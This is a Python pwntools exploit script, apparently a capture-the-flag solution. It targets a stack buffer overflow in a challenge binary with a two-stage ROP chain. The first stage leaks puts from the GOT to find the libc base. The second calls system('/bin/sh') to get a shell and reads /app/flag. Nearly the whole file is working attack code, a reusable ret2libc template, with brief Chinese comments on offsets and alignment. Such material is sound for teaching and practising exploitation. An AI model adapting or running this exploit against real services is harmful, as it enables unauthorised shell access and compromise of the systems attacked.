#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '9109'))

context(arch='amd64', os='linux', log_level='info')

elf = ELF(os.path.join(HERE, '..', 'files', 'pwn'))
libc = ELF(os.path.join(HERE, '..', 'files', 'libc.so.6'))

pop_rdi = elf.symbols['pop_rdi_ret']
ret = ROP(elf).find_gadget(['ret'])[0]
vuln = elf.symbols['vuln']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
log.info('pop_rdi=%#x ret=%#x vuln=%#x puts@plt=%#x puts@got=%#x',
         pop_rdi, ret, vuln, puts_plt, puts_got)

p = remote(HOST, PORT)
p.recvuntil(b'input:\n')

# stage 1: buf[64] 在 rbp-0x40，返回地址在 rbp+8 -> 72 字节；泄露 puts@got 后回到 vuln
p.send(b'A' * 72 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln))
leak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
log.success('puts = %#x  libc_base = %#x  system = %#x', leak, libc_base, system)

# stage 2: 多放一个 ret 让 system 在 call 前 16 字节对齐
time.sleep(0.2)
p.send(b'A' * 72 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
time.sleep(0.2)
p.sendline(b'cat /app/flag')
data = p.recvall(timeout=3)
sys.stdout.buffer.write(data)
